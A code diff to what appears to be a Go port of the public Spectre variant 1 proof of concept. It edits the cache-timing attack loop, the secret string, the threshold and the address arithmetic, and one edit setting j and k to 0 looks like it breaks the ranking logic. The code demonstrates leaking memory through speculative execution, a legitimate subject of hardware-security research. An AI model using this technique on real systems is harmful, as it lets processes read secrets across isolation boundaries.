@@ -3,7 +3,7 @@
 // https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 package main
 
-// #cgo CFLAGS: -O0 -march=native
+// #cgo CFLAGS:-march=native
 // #include <x86intrin.h> /* for rdtscp and clflush */
 // static inline void __wrapper_mm_clflush( const void *__p) {
 //   _mm_clflush(__p);
@@ -22,7 +22,7 @@ var array1 = [160]uint8{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
 var unused2 = [64]uint8{}
 var array2 = [256 * 512]uint8{}
 
-var secret = []byte("Hello sadness my old friend")
+var secret = []byte("Hello sadness my good old friend")
 var temp uint8 = 0
 
 func victim_function(x uint) {
@@ -35,7 +35,7 @@ func victim_function(x uint) {
 
 // ===================== Analysis code ===================
 
-const threshold = 80
+const threshold = 280
 
 func readMemoryBytes(malicious_x uint, value []uint8, score []int) {
 	results := [256]int{}
@@ -74,8 +74,8 @@ func readMemoryBytes(malicious_x uint, value []uint8, score []int) {
 				results[mix_i]++
 			}
 		}
-		j = -1
-		k = -1
+		j = 0
+		k = 0
 		for i = 0; i < 256; i++ {
 			if j < 0 || results[i] >= results[j] {
 				k = j
@@ -99,28 +99,24 @@ func readMemoryBytes(malicious_x uint, value []uint8, score []int) {
 // =======================================================
 
 func main() {
-	malicious_x := *(*uint)(unsafe.Pointer(uintptr(unsafe.Pointer(&secret)) - uintptr(unsafe.Pointer(&array1))))
+	malicious_x := uint(uintptr(unsafe.Pointer(&([]byte(secret)[0]))) - uintptr(unsafe.Pointer(&array1[0])))
 	for i := range array2 {
 		array2[i] = 1
 	}
 	var score = []int{0, 0}
 	var value = []uint8{0, 0}
-	len := 40
+	len := len(secret)
 	fmt.Printf("Reading %d bytes:\n", len)
 	for ; len >= 0; len-- {
-		fmt.Printf("Reading at malicious_x = %p... ", malicious_x)
+		fmt.Printf("Reading at malicious_x = %x... ", malicious_x)
 		readMemoryBytes(malicious_x, value, score)
 		malicious_x++
 		if score[0] >= 2*score[1] {
 			fmt.Printf("Success: ")
 		} else {
-			fmt.Printf("Failure: ")
+			fmt.Printf("Unclear: ")
 		}
-		if value[0] > 31 && value[0] < 127 {
-			fmt.Printf("0x%02X=’%c’ score=%d '", value[0], value[0], score[0])
-		} else {
-			fmt.Printf("0x%02X=’%c’ score=%d '", value[0], "?", score[0])
-		}
+		fmt.Printf("0x%02X=’%s’ score=%d '", value[0], string(value[0]), score[0])
 		if score[1] > 0 {
 			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
 		}
